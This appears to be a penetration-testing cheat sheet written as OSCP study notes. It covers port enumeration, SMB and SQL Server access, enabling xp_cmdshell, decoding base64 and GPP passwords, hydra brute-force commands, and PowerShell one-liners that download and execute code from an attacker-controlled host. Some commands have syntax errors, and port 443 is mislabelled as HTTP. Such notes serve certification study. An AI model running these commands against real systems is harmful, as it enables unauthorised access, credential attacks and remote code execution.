# OSCP-NOTES
## Enumeration
1. Ports
```
port 21 — FTP (File Transfer Protocol)
port 22 — SSH (Secure Shell)
port 23 — Telnet
port 25 — SMTP (Simple Mail Transfer Protocol)
port 53 — DNS (Domain Name System)
port 443 — HTTP (Hypertext Transport Protocol) and HTTPS (HTTP over SSL)
port 110 — POP3 (Post Office Protocol version 3)
port 135 — Windows RPC
ports 137–139 — Windows NetBIOS over TCP/IP
port 1433 and UDP port 1434 — Microsoft SQL Server
```
* Port 21 FTP
```
ftp <ip>
nc <ip> 21
```
* Port 22 SSH
```
nc -w <ip> 22
```
* Port 25 SMTP
```
nc -w <ip> 25
telnet <ip> 25
```
* Port 110 POP3
```
telnet <ip> 110
* USER <username>
* PASS <password>
* list #list mails
* retr #cd
```
* Port 139 & 445 SMB
```
#check list
smbclient -L <ip>
enum4linux -a <ip>
smbmap -H <ip>
#Login
smbclient //<ip>/<filename> -U <username>
```
* Port 1433 MsSQL
```
sqsh -S <ip> -U <username> or sqsh -S <ip> -U <username> -P "<password>"
* 1> EXEC SP_CONFIGURE N'show advanced options', 1
* 2> go
Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
(return status = 0)
* 1> EXEC SP_CONFIGURE N'xp_cmdshell', 1
* 2> go
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
(return status = 0)
* 1> RECONFIGURE
* 2> go
* 1> xp_cmdshell 'dir C:\';
* 2> go
```
* SSH login
```
ssh <username@ip> 
```
* Password Decrypt
  * Decode Base64 Encoded Values
  ```
  echo -n "QWxhZGRpbjpvcGVuIHNlc2FtZQ==" | base64 --decode
  ```
  * Decode Hexidecimal Encoded Values
  ```
  echo -n "46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874" | xxd -r -ps
  ```
  * GPP Password
  ```
  gpp-decrypt <code>
  ```
* Send a file using netcat
  * send    
  ```
  nc -nlvp <ip> < <filename>
  ```
  * receive 
  ```
  nc -w 3 <ip> > <outputfilename>
  ```
* Brute Force
  * ssh
  ```
  hydra -l <user.txt> -p <pass.txt> <ip> ssh
  ```
  * telnet
  ```
  hydra -l root -P <password.txt> <ip> telnet
  ```
 * Powershell Download
 ```
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<LHOSTIP>/<filename>', '<Location\filename>')"
 powershell -c CreateObject("WScript.Shell").Exec("cmd /c powershell IEX(New-Object Net.WebClient).DownloadString('http://<LHOSTIP>/<filename>')")
 powershell -c "Invoke-WebRequest -Uri <LHOSTIP>/<filename> -Outfile <Location\filename>"
 ```
